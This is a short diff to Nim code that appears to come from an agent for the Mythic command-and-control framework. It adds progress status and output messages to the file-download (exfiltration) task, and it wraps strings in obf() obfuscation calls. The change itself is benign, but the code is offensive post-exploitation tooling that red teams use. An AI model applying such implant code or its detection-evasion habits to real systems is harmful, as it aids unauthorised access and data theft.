@@ -56,9 +56,14 @@ proc executeDownload*(taskId: string, params: JsonNode): JsonNode =
       obf("is_screenshot"): false,
       obf("chunk_size"): CHUNK_SIZE
     }
-    
+
+    # status + user_output on the init so the task visibly leaves "submitted"
+    # as soon as Mythic processes the first response, instead of appearing
+    # stuck until the final completion message arrives.
     return %*{
       obf("task_id"): taskId,
+      obf("status"): obf("processing"),
+      obf("user_output"): obf("Starting download: ") & $fileSize & obf(" bytes in ") & $totalChunks & obf(" chunk(s)\n"),
       obf("download"): downloadResponse
     }
     
